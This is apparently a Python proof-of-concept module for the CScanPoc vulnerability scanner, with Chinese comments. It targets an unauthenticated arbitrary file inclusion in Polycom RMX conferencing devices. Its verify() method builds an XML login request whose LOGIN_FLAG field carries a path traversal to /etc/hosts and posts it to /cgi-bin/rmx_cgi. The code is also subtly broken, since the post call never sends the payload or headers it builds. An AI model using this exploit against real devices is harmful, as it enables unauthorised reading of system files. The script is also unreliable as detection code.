# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Polycom_0000'  # 平台漏洞编号
    name = '宝利通(Polycom,Inc.)旗下型号产品存在任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        宝利通(Polycom,Inc.)旗下型号产品存在任意文件包含漏洞，攻击者无需登录可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # https://wooyun.shuimugan.com/bug/view?bug_no=149670
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '宝利通'  # 漏洞组件名称
    product_version = 'Polycom RMX 500,Polycom RMX 1000,Polycom RMX 500C'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f00a709e-a018-413d-a93b-d891635a7142'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/cgi-bin/rmx_cgi'
            headers = {
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            data = '''
                <RMX1000_UI version="**.**.**.**">
            	<FROM_PAGE id="check_login_rst">
            		<SESSION_ID value="" />
            		<_CGI_NO_REFRESH value="YES" />
            		<SEL_LANG value="cn" />
            		<IS_CGI value="YES" />
            		<DEV_IP_V4 value="" />
            		<LOGINNAME value="asdasd" />
            		<PASSWD value="asdasd" />
            		<rmx1000_ip value="**.**.**.**" />
            		<proxy_log_ip value="" />
            		<LOGIN_FLAG value="../../etc/hosts" />
            		<_CGI_UI_LANG value="cn" />
            		<cfg_ui_hide value="YES" />
            		<_CGI_TIME value="Mon Oct 26 21:19:24 UTC+0800 2015" />
            	</FROM_PAGE>
            </RMX1000_UI>
            '''
            response = requests.post(vul_url)
            if response.status_code == 200 and 'localhost' in response.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
